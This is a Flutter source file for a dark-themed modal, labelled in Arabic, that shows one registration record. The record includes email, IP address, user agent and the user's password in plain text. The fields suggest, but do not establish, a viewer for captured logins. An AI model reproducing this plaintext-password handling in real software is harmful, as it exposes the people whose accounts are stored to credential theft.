import 'package:flutter/material.dart';
import '../models/registration.dart';
import '../utils/app_colors.dart';
import '../utils/helpers.dart';

class DetailModal extends StatelessWidget {
  final Registration registration;

  const DetailModal({super.key, required this.registration});

  @override
  Widget build(BuildContext context) {
    final r = registration;
    final d = r.createdAt;

    return Container(
      margin: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: const Color(0xFF12121F),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white.withOpacity(0.1)),
      ),
      child: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            // العنوان
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                const Text(
                  '📄 التفاصيل',
                  style: TextStyle(
                    fontSize: 18,
                    fontWeight: FontWeight.w700,
                  ),
                ),
                GestureDetector(
                  onTap: () => Navigator.pop(context),
                  child: Container(
                    width: 34,
                    height: 34,
                    decoration: BoxDecoration(
                      color: Colors.white.withOpacity(0.05),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(
                        color: Colors.white.withOpacity(0.1),
                      ),
                    ),
                    child: const Icon(Icons.close, size: 18),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 20),

            _DetailRow(label: '🆔 الرقم', value: '${r.id}'),
            _DetailRow(
              label: '📧 البريد',
              value: r.email,
              valueColor: AppColors.blue,
            ),
            _DetailRow(
              label: '🔑 كلمة المرور',
              value: r.password,
              isMono: true,
            ),
            _DetailRow(
              label: '🌐 IP',
              value: r.ipAddress ?? 'غير متوفر',
            ),
            _DetailRow(
              label: '📅 التاريخ',
              value:
                  '${Helpers.formatDate(d)} ${Helpers.formatTime(d)}',
            ),
            _DetailRow(
              label: '⏳ منذ',
              value: Helpers.relativeTime(d),
            ),
            if (r.userAgent != null && r.userAgent!.isNotEmpty)
              _DetailRow(
                label: '🖥️ المتصفح',
                value: r.userAgent!.length > 100
                    ? r.userAgent!.substring(0, 100)
                    : r.userAgent!,
                valueSize: 10,
              ),

            const SizedBox(height: 10),
          ],
        ),
      ),
    );
  }
}

class _DetailRow extends StatelessWidget {
  final String label;
  final String value;
  final Color? valueColor;
  final bool isMono;
  final double? valueSize;

  const _DetailRow({
    required this.label,
    required this.value,
    this.valueColor,
    this.isMono = false,
    this.valueSize,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 12),
      decoration: BoxDecoration(
        border: Border(
          bottom: BorderSide(
            color: Colors.white.withOpacity(0.05),
          ),
        ),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(
            label,
            style: TextStyle(
              fontSize: 13,
              color: Colors.white.withOpacity(0.4),
            ),
          ),
          const SizedBox(width: 16),
          Flexible(
            child: Text(
              value,
              style: TextStyle(
                fontSize: valueSize ?? 14,
                fontWeight: FontWeight.w500,
                color: valueColor ?? Colors.white,
                fontFamily: isMono ? 'Courier' : null,
              ),
              textAlign: TextAlign.left,
              textDirection: TextDirection.ltr,
              overflow: TextOverflow.ellipsis,
              maxLines: 2,
            ),
          ),
        ],
      ),
    );
  }
}